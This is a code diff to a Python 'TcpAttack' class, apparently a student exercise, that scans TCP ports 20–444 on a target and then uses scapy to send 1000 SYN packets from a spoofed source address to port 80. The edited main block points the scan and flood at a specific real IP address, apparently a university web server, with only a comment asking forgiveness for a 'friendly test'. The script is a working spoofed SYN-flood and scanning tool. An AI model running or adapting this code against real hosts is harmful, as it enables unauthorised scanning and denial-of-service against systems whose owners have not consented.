@@ -17,11 +17,14 @@ class TcpAttack:
         f.write("Opened ports: \n")
 
         for port in range(rangeStart, rangeEnd):
-
+	    
+	    # create a socket using default parameters
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+            # set the timeout
             s.settimeout(0.5)
 
+            # try to connect
             result = s.connect_ex((self.targetIP, port))
 
             if (result == 0):
@@ -46,6 +49,7 @@ class TcpAttack:
 
         if (result == 0):
             for ct in range(1000):
+		# use scapy to send SYN packet
                 send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(), dport=port, flags="S"))
             return 1
         else:
@@ -54,15 +58,21 @@ class TcpAttack:
 
 if __name__ == "__main__":
 
-    # spoofIP is locakhost; targetIP is a purdue cam2 website
-    # please forgive this friendly test
-    # I don't think 1000 SYN packets will cause any problem. 
-    tcp = TcpAttack('localhost', 'cam2.ecn.purdue.edu')
+    spoofIP = '192.137.43.211'  # a fake IP address I made up
+    targetIP = '128.46.75.105'  # A website has only one static ip
+
+    rangeStart = 20
+    rangeEnd = 445
+    port = 80    # The server of a website must open its 80 port
+
+    # please forgive this friendly test.
+    # I really don't think 1000 SYN packets will cause any problem. 
+    tcp = TcpAttack(spoofIP, targetIP)
 
     # scan ports from 20 to 444
-    tcp.scanTarget(20, 445)
+    tcp.scanTarget(rangeStart, rangeEnd)
 
     # attack 80 port
-    result = tcp.attackTarget(80)
+    if (tcp.attackTarget(80)):
+	print "port was open to attack"
 
-    print(result)
